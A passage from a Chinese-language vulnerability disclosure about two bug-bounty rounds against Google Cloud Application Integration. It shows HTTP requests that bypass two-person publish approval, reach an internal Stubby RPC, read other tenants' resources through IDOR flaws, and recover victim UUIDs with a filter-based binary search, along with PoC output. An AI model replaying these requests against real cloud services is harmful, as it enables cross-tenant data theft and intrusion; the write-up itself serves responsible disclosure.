　"taskConfigs": [{"taskName": "GenericStubbyTypedTaskV2", "taskNumber": "1", "parameters": {  
  
　　"response": {"key": "response", "value": {"stringValue": "$response$"}, "dataType": "STRING_VALUE"},  
  
　　"serverSpec": {"key": "serverSpec", "value": {"stringValue": "gslb:alkali-base"}, "dataType": "STRING_VALUE"},  
  
　　"serviceName": {"key": "serviceName", "value": {"stringValue": "ServerStatus"}, "dataType": "STRING_VALUE"},  
  
　　"serviceMethod": {"key": "serviceMethod", "value": {"stringValue": "GetServices"}, "dataType": "STRING_VALUE"}},  
  
　　"position": {"x": -716, "y": -445}, "label": "Stubby Internal", "taskType": "ASIS_TEMPLATE",  
  
　　"externalTaskType": "NORMAL_TASK"}],  
  
　"triggerConfigs": [{"startTasks": [{"taskNumber": "1"}], "triggerType": "API", "triggerNumber": "1",  
  
　　"enabledClients": ["default"], "triggerId": "api_trigger/my-api-trigger-123"}],  
  
　"status": "DRAFT", "snapshotNumber": "1", "tags": ["HEAD"], "clientId": "default"}}  
  
这里的每一步都跟 Application Integration 对得上：工作流结构、任务配置，乃至发布和运行的流程。  
  
看我们工作流里那个 "position": {"x": -716, "y": -445} 了吗？  
  
内部 UI 大概长得很像 Application Integration 的可视化工作流编辑器，我们实质上是在给任务设置坐标：  
  
![Application Integration workflow editor](../../.resource/remote/e7961766dd6f309b846877a28be958d9fe4f259838e0f9568f1676340b31d64f.jpg "")  
  
  
Application Integration 的可视化工作流编辑器：与内部 UI 的结构一致  
  
还记得之前挡住我发布的 ACL 问题吗？  
  
shrugged 想出了绕法——把 IP_EVENTBUS_WORKFLOWS 的 ACL 更新成两个攻击者控制的 Google 账号的混淆 Gaia ID：  
  
●  
●  
●  
请求 · setAcl  
  

```http
POST /v1/integrationPlatform/auth:setAcl HTTP/2  
  
Host: cloudcrmipfrontend-pa.clients6.google.com  
  
Origin: https://console.cloud.google.com  
  
Content-Type: application/json  
  
Content-Length: 500  
  
  
{"resourceInfo": {"resource": "IP_EVENTBUS_WORKFLOWS", "id": "retest-test123"},  
  
　"acl": {"entries": [  
  
　　{"scope": {"obfuscatedGaiaId": "100029910836469267942"}, "role": 105},  
  
　　{"scope": {"obfuscatedGaiaId": "113728935872649341310"}, "role": 105}]}}  
```

  
●  
●  
●  
响应  
  
HTTP/2 200 OK  
  
Content-Type: application/json; charset=UTF-8  
  
  
{}  
  
先用第一个攻击者账号把请求切换成「请求发布」：  
  
●  
●  
●  
请求 · toggleRequestToPublishWorkflow  
  
```http
POST /v1/integrationPlatform/workflowdeployment:toggleRequestToPublishWorkflow HTTP/2  
  
Host: cloudcrmipfrontend-pa.clients6.google.com  
  
Content-Type: application/json  
  
  
{"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19"}  
```

  
再用第二个账号真正发布工作流——两人审批就此失效：  
  
●  
●  
●  
请求 · publishWorkflow（第二个账号）  
  
```http
POST /v1/integrationPlatform/workflowdeployment:publishWorkflow HTTP/2  
  
Host: cloudcrmipfrontend-pa.clients6.google.com  
  
Content-Type: application/json  
  
  
{"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19"}  
```

  
运行一个配置了 GenericStubbyTypedTaskV2 的工作流，serverSpec 设为 gslb:alkali-base、服务和方法设为 /ServerStatus.GetServices，我们就执行了 Stubby 查询：  
  
●  
●  
●  
响应 · 内部 Stubby 服务清单（节选）  
  
...  
  
{  
  
　　"protoValue": {  
  
　　"@type": "type.googleapis.com/rpc.ServiceList",  
  
　　"service": [  
  
　　　　{  
  
　　　　"name": "AlkaliBaseAccountService",  
  
　　　　"descriptor": {  
  
　　　　　　"filename": "google/internal/alkali/base/v1/alkali_base_account_service.proto",  
  
　　　　　　"name": "AlkaliBaseAccountService",  
  
　　　　　　"method": [  
  
　　　　　　{  
  
　　　　　　　　"name": "ListAccounts",  
  
　　　　　　　　"argumentType": "google.internal.alkali.base.v1.ListAccountsRequest",  
  
　　　　　　　　"resultType": "google.internal.alkali.base.v1.ListAccountsResponse",  
  
　　　　　　　　"deadline": 30,  
  
　　　　　　　　"securityLevel": "none"  
  
　　　　　　},  
  
　　　　　　...  
  
　　　　}  
  
　　　　}  
  
　　]  
  
}  
  
之后我们把 RCE 升级补进了最初的报告。  
  
时机卡得极紧：  
  
PoC 跑通一小时后，createDraftWorkflow 的修复就完全生效了。  
  
再晚一点，这次 RCE 升级就只会停在理论层面。  
  
话说回来，我们还没真正在 Google 服务器上执行代码，就被叫停了。  
  
六  
第一轮时间线  
  
<table><thead><tr><th style="background:#f1f5f9;color:#0f172a;text-align:left;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;font-weight:700;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="vzGebsHf4q8yyTWFIKyz0H" data-dm-ref="1408">日期</span></section></th><th style="background:#f1f5f9;color:#0f172a;text-align:left;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;font-weight:700;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="46IfHpZ9JYfNczrk1CIsTE" data-dm-ref="1410">事件</span></section></th></tr></thead><tbody><tr><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="uNT9amC2ha04FxuVIrty0S" data-dm-ref="1414">2025-12-01</span></section></td><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="ykhTfrQAgDG0GYtu1GpEwc" data-dm-ref="1416">初始报告提交给 Google</span></section></td></tr><tr><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="1KwcOK095SzWF5K8w6VmN0" data-dm-ref="1419">2025-12-01</span></section></td><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="fbyDK5Wl6lPJ9HXwm0GuQm" data-dm-ref="1421">Google 定级 P0/S0</span></section></td></tr><tr><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="mga2idg3AVvMPrc5jh4POV" data-dm-ref="1424">2025-12-01</span></section></td><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="LlODE7WXPtHeWAKQYycjj3" data-dm-ref="1426">Nice catch!</span></section></td></tr><tr><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="SbxPSAuEVazLpWDJdqXAFk" data-dm-ref="1429">2026-01-12</span></section></td><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="CH241nLPKZDH5xQHcIPi8F" data-dm-ref="1431">向 Google 安全团队说明 RCE 升级</span></section></td></tr><tr><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="I6xah1YtcOXUWPYhPp1y8F" data-dm-ref="1434">2026-01-12</span></section></td><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="8H7fBPd2DfRGZLZzyBnVww" data-dm-ref="1436">报告更新 RCE PoC，随后被 Google 升级</span></section></td></tr><tr><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="Vmmy0pftvKJ6cGmTCUQk4k" data-dm-ref="1439">2026-01-16</span></section></td><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="tIDAA0IRgisWzBS0zuoWWY" data-dm-ref="1441">评审组奖励 $60,000</span></section></td></tr></tbody></table>  
  
评审组给出的理由  
  
这份报告质量极高。  
  
漏洞类别为「Google Cloud 生产环境被攻陷」。  
  
攻击者与受害者之间无需任何交互或关系。  
  
默认 Google Cloud 产品。  
  
第一轮攻击链 · 从调试端点到 Stubby 原语  
  
① 泄露 proto 定义  
→  
② 泄露 client_id  
  
③ 绕过发布限制  
→  
④ 配置 Stubby 任务  
  
⑤ 执行内部 RPC  
  
七  
第二轮：三个月后  
  
你以为到这就结束了？  
  
没那么容易。  
  
三个月后，我的 fuzzer 又报来一批 IDOR，位于公开产品 Application Integration 的公开 API 上。  
  
结果发现，这整张 API 里，你可以在 URL 里引用自己的 project ID，却引用别人的 UUID：  
  
●  
●  
●  
请求 · 越权读取集成版本  
  
GET /v1/projects/`<your-project>`/locations/us-central1/integrations/anythinghere/versions/`<victim-uuid>` HTTP/2  
  
Host: integrations.googleapis.com  
  
Authorization: Bearer `<redacted>`  
  
API 会开开心心地把受害者的资源返回给你——因为认证检查是针对你的 project ID 做的（你当然对自己项目有权限），但没有任何访问控制去检查这个 ID 是否真的属于你的项目。  
  
光是这个，影响有限，因为这些都是 UUIDv4。  
  
搜索空间 10^36，暴力枚举没有现实意义。  
  
所以我开始找有没有办法泄露受害者的资源 UUID。  
  
这时我注意到一个有意思的「测试用例」功能。  
  
按官方文档：用 Application Integration，你可以针对复杂的集成创建并运行多个测试用例；通过测试你的集成流程，可以确保集成按预期工作。  
  
前端加载测试用例时，浏览器会发这样的请求：  
  
●  
●  
●  
请求 · ListTestCases  
  

```http
POST /$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases HTTP/2  
  
Host: us-central1-integrations.clients6.google.com  
  
Content-Type: application/x-protobuf  
  
  
< RAW PROTOBUF DATA >  
```

  
真正的请求体是 protobuf，我把它解码出来是这样的：  
  
●  
●  
●  
解码后的请求体  
  
{  
  
　"1": "projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4",  
  
　"2": "workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4",  
  
　"6": {  
  
　　"1": ["name", "display_name", "update_time", "client_id"]  
  
　}  
  
}  
  
字段 1 是父资源（我的项目、我的版本 UUID），字段 6 是响应字段掩码，而字段 2 的 workflow_id = ... 看起来是一种过滤器。  
  
会不会只要不带这个字段，它就会返回所有工作流的测试用例？  
  
应该不至于吧……  
  
把字段 2 和 6 从请求里去掉：  
  
●  
●  
●  
请求体（去掉 filter 与字段掩码）  
  
{  
  
　"1": "projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4"  
  
}  
  
……响应里带回了每一个其他 GCP 项目的测试用例：  
  
●  
●  
●  
响应 · 跨项目测试用例泄露（节选）  
  
{  
  
　"testCases": [  
  
　　{  
  
　　　"name": "projects/331540621401/locations/us-central1/integrations/my-draft-integration/versions/631a0566-02fc-4dce-b319-25e2c68168f4/testCases/b25fb963-792c-419d-a98b-eb930b2a29e3",  
  
　　　"displayName": "test",  
  
　　　"triggerId": "api_trigger/AI_bebbia_CreateWOSubs_API_1",  
  
　　　"testInputParameters": [  
  
　　　　{  
  
　　　　　"key": "InputData",  
  
　　　　　"dataType": "JSON_VALUE",  
  
　　　　　"defaultValue": {  
  
　　　　　　"jsonValue": "{\n  \"OldSKU\": \"300465\",\n  \"orderid\": \"7fe9ffa9-d122-484b-96df-9ef85cd3aa8a\",\n  ...\n}"  
  
　　　　　},  
  
　　　　　"displayName": "InputData"  
  
　　　　}  
  
　　　],  
  
　　　"creatorEmail": "redacted@google.com",  
  
　　　...  
  
　　}  
  
　]  
  
}  
  
不过仔细看响应，你会发现一处不对劲。  
  
每一条结果里的 versions/... 段都是 631a0566-02fc-4dce-b319-25e2c68168f4——那是我在字段 1 里发过去的我的版本 UUID。  
  
API 只是把它原样反射进了每一条测试用例的 name 里，而这些测试用例属于完全不同的项目、不同的集成。  
  
所以现在我有跨全部 GCP 项目的测试用例 ID、集成名和创建者邮箱，但我真正需要的、用来喂给前面那些 IDOR 的受害者版本 UUID，响应里一个都没有。  
  
话虽如此，光测试用例 ID 就足够造成真实影响了。  
  
Application Integration 暴露了一个 :executeTest 端点，按 ID 运行测试用例，而且它并不需要受害者真正的版本 UUID。  
  
●  
●  
●  
请求 · executeTest  
  
POST /v1/projects/`<your-project>`/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest HTTP/2  
  
Host: integrations.googleapis.com  
  
Authorization: Bearer `<redacted>`  
  
Content-Length: 0  
  
●  
●  
●  
响应  
  
{  
  
　"executionId": "5d49abed-7692-47aa-8660-5cdaea92d2af",  
  
　"outputParameters": {  
  
　　"output": 3  
  
　},  
  
　"assertionResults": [  
  
　　{  
  
　　　"assertion": {  
  
　　　　"assertionStrategy": "ASSERT_EQUALS",  
  
　　　　"parameter": { "key": "output", "value": { "intValue": "3" } }  
  
　　　},  
  
　　　"taskNumber": "1",  
  
　　　"taskName": "JsonnetMapperTask",  
  
　　　"status": "SUCCEEDED"  
  
　　}  
  
　],  
  
　"testExecutionState": "PASSED"  
  
}  
  
所以我已经能在任意受害者的环境里触发任意测试用例执行了。  
  
但真正的目标仍然是利用前面的 IDOR 读取受害者的整个集成，而这需要真实的版本 UUID。  
  
我在这卡了一会儿，直到冒出一个想法：  
  
filter 参数（字段 2）明显支持 = 这种比较运算符。  
  
那它会不会也支持 > 和 <=？  
  
如果支持，我就能锚定一个已知的测试用例 ID，然后对 workflow_id 字段做二进制搜索，一次一个十六进制字符，直到把整个 UUID 拼出来：  
  
●  
●  
●  
二进制搜索条件  
  
id = "`<known-tc-uuid>`" AND workflow_id > "`<low>`" AND workflow_id <= "`<high>`"  
  
每个请求都会收窄区间。  
  
如果测试用例仍然出现在响应里，真实的 workflow_id 就在 (low, high] 内，否则就在区间外。  
  
一个 32 字符的十六进制 UUID，128 个请求就能逼出来。  
  
我让 Claude 写了个 PoC，一次跑通：  
  
●  
●  
●  
extract_by_id.py · 运行输出  
  
$ python extract_by_id.py --token "`<redacted>`" --project 273897706296 --location "us-central1" --tc-id "60413427-4d07-4c36-bce0-66cfcdd81879"  
  
Test case: 60413427-4d07-4c36-bce0-66cfcdd81879  
  
Parent:    projects/273897706296/locations/us-central1/integrations/x/versions/-  
  
  
Verified: target found. Starting binary search...  
  
  
　[ 4/32] fb1d0000-0000-0000-0000-000000000000  (16 reqs)  
  
　[ 8/32] fb1dc5f3-0000-0000-0000-000000000000  (32 reqs)  
  
　[12/32] fb1dc5f3-0380-0000-0000-000000000000  (48 reqs)  
  
　[16/32] fb1dc5f3-0380-491c-0000-000000000000  (64 reqs)  
  
　[20/32] fb1dc5f3-0380-491c-af90-000000000000  (80 reqs)  
  
　[24/32] fb1dc5f3-0380-491c-af90-5a1400000000  (96 reqs)  
  
　[28/32] fb1dc5f3-0380-491c-af90-5a141aa00000  (112 reqs)  
  
　[32/32] fb1dc5f3-0380-491c-af90-5a141aa02f56  (128 reqs)  
  
  
workflow_id: fb1dc5f3-0380-491c-af90-5a141aa02f56  
  
Total requests: 128  
  
现在我拿到了受害者真实的集成版本 UUID。  
  
把它和 GetIntegrationVersion 的 IDOR 串起来：  
  
●  
●  
●  
请求 · GetIntegrationVersion  
  
GET /v1/projects/`<your-project>`/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56 HTTP/2  
  
Host: integrations.googleapis.com  
  
Authorization: Bearer `<redacted>`  
  
●  
●  
●  
响应 · 另一个项目的完整集成（节选）  
  
{  
  
　"name": "projects/`<your-project>`/locations/us-central1/integrations/TestCasePOC5/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56",  
  
　"state": "DRAFT",  
  
　"triggerConfigs": [  
  
　　{  
  
　　　"label": "API Trigger",  
  
　　　"triggerType": "API",  
  
　　　"triggerId": "api_trigger/TestCasePOC5_API_1"  
  
　　}  
  
　],  
  
　"taskConfigs": [  
  
　　{  
  
　　　"task": "GenericRestV2Task",  
  
　　　"displayName": "Call REST Endpoint",  
  
　　　"parameters": {  
  
　　　　"url": { "key": "url", "value": { "stringValue": "$url$" } },  
  
　　　　"httpMethod": { "key": "httpMethod", "value": { "stringValue": "POST" } },  
  
　　　　"authConfigName": { "key": "authConfigName", "value": { "stringValue": "authprofiletest" } }  
  
　　　}  
  
　　}  
  
　],  
  
　"integrationParameters": [  
  
　　{ "key": "url", "dataType": "STRING_VALUE", "defaultValue": { "stringValue": "https://example.com" } }  
  
　],  
  
　"lastModifierEmail": "gvrptest4@gmail.com",  
  
　"createTime": "2026-03-22T11:10:30.087Z"  
  
}  
  
如果还记得最初那份测试用例 dump，里面有相当一部分 creatorEmail 是以 @google.com 结尾的——有不少 Google 内部团队在这个平台上跑自己的集成。  
  
我下一个念头很明显：  
  
这些 Googler 的集成里，会不会已经有人配置了 GenericStubbyTypedTaskV2（或者 PythonTask、CreateBuganizerIssueTask 之类的内部专用任务）？  
  
只要有任何一个，这条跨租户链就能升级成严重得多的东西。  
  
但我没法去验证。  
  
做这件事意味着要遍历真实客户数据，那会违反 Google VRP 的规则。  
  
所以我把手上的东西整理好，直接交给了 Cloud VRP。  
  
漏洞点评  
  
把「不可爆破」变成「可枚举」，是这个技巧的全部价值——filter 支持比较运算、结果又回显，每个请求就变成一个「目标 ID 比这个值大吗」的判定器，128 次请求确定性地抠出 128 bit 的 ID。  
  
八  
配置内部任务类型：第二轮 RCE  
  
这让我开始想：  
  
到底是什么在阻止我自己创建一个带内部任务类型的集成？  
  
试一下：  
  
●  
●  
●  
请求 · 创建带 PythonTask 的集成版本  
  

```http
POST /v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions HTTP/2  
  
Host: integrations.googleapis.com  
  
Authorization: Bearer <redacted>  
  
Content-Length: 1033  
  
  
{  
  
　"taskConfigsInternal": [  
  
　　{  
  
　　　"taskNumber": "1",  
  
　　　"taskName": "PythonTask",  
  
　　　...  
  
　　　"taskEntity": {  
  
　　　　"uiConfig": {  
  
　　　　　"taskUiModuleConfigs": [  
  
　　　　　　{ "moduleId": "RPC_TYPED" }  
  
　　　　　]  
  
　　　　}  
  
　　　},  
  
　　　"taskType": "ASIS_TEMPLATE",  
  
　　　"parameters": {  
  
　　　　"TEST": { "key": "test", "value": { "stringValue": "test" } }  
  
　　　}  
  
　　}  
  
　],  
  
　...  
  
}  
```


  
●  
●  
●  
响应  
  
HTTP/2 200 OK  
  
Content-Type: application/json; charset=UTF-8  
  
  
{  
  
　"name": "projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions/304adc1b-6d09-4b2d-a070-db48b821879a",  
  
　"origin": "UI",  
  
　"snapshotNumber": "1",  
  
　"updateTime": "2026-05-01T07:30:07.182512Z",  
  
　"lockHolder": "gvrptest4@gmail.com",  
  
　"lastModifierEmail": "gvrptest4@gmail.com",  
  
　"state": "DRAFT",  
  
　...  
  
}  
  
真的可以。  
  
但当我试图真正执行这个工作流时，它直接超时了：  
  
●  
●  
●  
执行报错  
  
Execution timeout, cancelled graph execution. The default timeout is 2min for sync  
  
execution and 10min for async execution. If you are using sync execution, please try  
  
async execution such as the Schedule API or Cloud Scheduler trigger.  
  
error/code: 'common_error_code: SYNC_EVENTBUS_EXECUTION_TIMEOUT'  
  
有一处很怪：  
  
当我配置 PythonTask（内部任务之一）、创建测试用例并执行它时，前端收到的不是超时，而是这个可疑的错误：  
  
●  
●  
●  
测试用例执行返回  
  
{  
  
　"1": 9,  
  
　"2": "java.io.IOException: No space left on device"  
  
}  
  
这是执行后端抛出的真实异常，不是超时——不管测试用例走的是哪条代码路径，它已经深到在真实磁盘 I/O 上失败了。  
  
用 GenericStubbyTypedTaskV2 试同样的手法，拿到的是一个信息更少、但同样可疑的响应：  
  
●  
●  
●  
测试用例执行返回  
  
Failed to execute test case. Error: Unknown Error.  
  
我去查了工作流执行日志，真正的错误这才露出来：  
  
●  
●  
●  
工作流执行日志  
  
{  
  
　"message": "com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w ",  
  
　"code": 500  
  
}  
  
这非常可疑。  
  
我肯定摸到东西了。  
  
访问这个端点：  
  
●  
●  
●  
请求 · 下载执行栈  
  
GET /v1/projects/`<project>`/locations/us-west1/integrations/ExampleTest1234:1/executions/id:download HTTP/2  
  
Host: integrations.googleapis.com  
  
Authorization: Bearer `<redacted>`  
  
就能把完整的堆栈拉下来：  
  
●  
●  
●  
堆栈（节选）  
  
com.google.enterprise.crm.exceptions.IpCanonicalCodeException:  
  
　com.google.enterprise.crm.eventbus.testcase.task.mock.MockExecutionFailureException:  
  
　com.google.net.rpc3.client.RpcClientException:  
  
　`<eye3 title='/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED'/>` APPLICATION_ERROR;  
  
　enterprise.crm.eventbus.stubby/EventbusStubbyCallerService.ExecuteStubbyCall;  
  
　com.google.security.authentication.common.CredentialsUnsupportedException:  
  
　UberMint verification is disabled. You can enable it in AuthenticationMethods;  
  
　RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w ;  
  
　AppErrorCode=16;StartTimeMs=1774319566778;unknown;ResFormat=uncompressed;  
  
　Server=[2002:a05:6670:4003:b0:ced:80ad:4c54]:4001 Code: FAILED_PRECONDITION  
  
	at ...EventbusStubbyCallerService.ExecuteStubbyCall(...)  
  
	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:744)  
  
	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.toParameterValueType(EventParametersUtil.java:654)  
  
	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.lambda$addEventParametersToEventMessage$0(EventParametersUtil.java:475)  
  
　...  
  
这就清楚了：  
  
我们的变量被直接塞进后端的一个 ExecuteStubbyCallRequest 里。  
  
根据折腾参数值时看到的堆栈，我猜后端代码大概长这样：  
  
●  
●  
●  
后端伪代码（据堆栈推测）  
  
GenericStubbyTypedTaskV2.buildRequest():  
  
　　line 219: setServerAddress(serverSpec)  → ExecuteStubbyCallRequest.java:1123  
  
　　line 220: setServiceName(serviceName)   → ExecuteStubbyCallRequest.java:1219  
  
　　line 221: setMethodName(serviceMethod)  → ExecuteStubbyCallRequest.java:1313  
  
那是不是还有某个参数是必需的？  
  
问题在于，堆栈只帮我泄露了已知的三个参数——serverSpec、serviceName、serviceMethod，我没能从这条路径上挖出更多。  
  
另外，Google 把这类 RCE 升级当作安全事件处理，所以在继续之前，我向 Google 安全团队申请了放行。  
  
他们很快回复，确认这确实可利用，并让我停止进一步测试。  
  
报告很快被升级为 P0/S0，并收到 Nice catch。  
  
差不多一个月后，这份报告在「Google Cloud 生产环境被攻陷」类别下获得 $75,000，是我到那时为止单笔最高的赏金。  
  
RCE 赏金的基础档位  
  
$50k：  
  
相对无特权的生产用户访问；  
  
$75k：  
  
有特权的生产用户访问；  
  
$100k：  
  
Google Cloud 管理员。  
  
一次 RCE 落在哪一档，看被攻陷的 prod 身份能直接摸到多少生产环境。  
  
生产环境的攻击面就这么大，拿到任意一个初始访问，往上提权几乎是一定的。  
  
Google 对具体理由说得很含糊，但看起来内部团队自己排查这条链时，发现的真实影响比我展示的还要大得多——这就是它落在 $75k 这一档的原因。  
  
漏洞点评  
  
Google 的动作没得挑：  
  
几小时定级 P0/S0，一句 Nice catch，$60k、$75k、追加的 $13,337 都给得干脆。  
  
但定价理由始终含糊——$75k 这档只给了一句「有特权的生产用户访问」，说不清是哪个 prod 身份、最终能触达什么。  
  
他自己的判断是，内部团队排查时看到的真实影响比 PoC 大得多，而这部分至今没有对外解释。  
  
第二轮攻击链 · 从 IDOR 到跨租户内部任务  
  
① 越权 IDOR  
→  
② 测试用例泄露  
  
③ 二进制搜索 UUID  
→  
④ 读取任意集成  
  
⑤ 内部任务 RCE  
  
九  
第二轮时间线  
  
<table><thead><tr><th style="background:#f1f5f9;color:#0f172a;text-align:left;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;font-weight:700;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="jjT38qYot8M867HFCoqYAf" data-dm-ref="2243">日期</span></section></th><th style="background:#f1f5f9;color:#0f172a;text-align:left;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;font-weight:700;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="lV84F2ol8wDaxkvygZz6vI" data-dm-ref="2245">事件</span></section></th></tr></thead><tbody><tr><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="adHhkbCaGNdFUX3AnwZ4YA" data-dm-ref="2249">2026-03-21</span></section></td><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="K3r2qfy5mr5ROEN4fMsiRD" data-dm-ref="2251">初始报告提交给 Google</span></section></td></tr><tr><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="LIUygR8XrwktAHrgZfgM3T" data-dm-ref="2254">2026-03-23</span></section></td><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="Xe0B5Qvb7zdBLu3k5bsedm" data-dm-ref="2256">Google 定级 P1/S1</span></section></td></tr><tr><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="ZFCdQsCvkZFDb3Ow3HlgsG" data-dm-ref="2259">2026-03-23</span></section></td><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="kEvTrK4agXu5VpPo2MIb4X" data-dm-ref="2261">说明 RCE 升级，随即收到 Nice catch，报告升级为 P0/S0</span></section></td></tr><tr><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="uOHDoVdKKXLm3j72a6o9n6" data-dm-ref="2264">2026-04-28</span></section></td><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="lghD20JvjfSLmjmkOnc3Xm" data-dm-ref="2266">评审组奖励 $75,000</span></section></td></tr><tr><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="qCQePLxL0Q8DnZwue26Ele" data-dm-ref="2269">2026-05-06</span></section></td><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="JnYifck51TL1RifJZ44ABN" data-dm-ref="2271">告知 Google：GetIntegrationVersion RPC 仍然存在漏洞</span></section></td></tr><tr><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="vXNGKJX1ctPo9VCclH8Syw" data-dm-ref="2274">2026-05-08</span></section></td><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="krHBGt7jTuIT4GgVKq3gpT" data-dm-ref="2276">评审组追加奖励 $13,337</span></section></td></tr></tbody></table>  
  
追加奖励的理由  
  
漏洞类别为「单服务权限提升 - 写」，其余判定与第一轮一致。  
  
十  
漏洞点评：这 $148,337 买的是什么  
  
两轮 RCE 的入口形态毫不相同——第一轮是三个可配置参数，第二轮是一个未公开的任务类型名——但被卖掉的都是同一件事：授权边界没画在正确的地方。  
  
产品把内部编排原语（任意 Stubby 方法、内部任务类型）暴露给外部租户，服务端只认证、不鉴权，于是用户提交的一段配置被直接当成一次高权限内部调用；而内部能力只藏在 UI 里、不落在服务端类型白名单上，等于没藏。  
  
拿到 Stubby 原语之所以被直接定级为 RCE，是因为原语的杀伤半径由被劫持的 prod 身份决定，不是由你能在 borglet 上跑什么决定——地基则是那一个 schema 泄露端点，没有它，后面每一步「我知道该填哪个参数」都不成立。  
  
这 $148,337 买的就是这件事：  
  
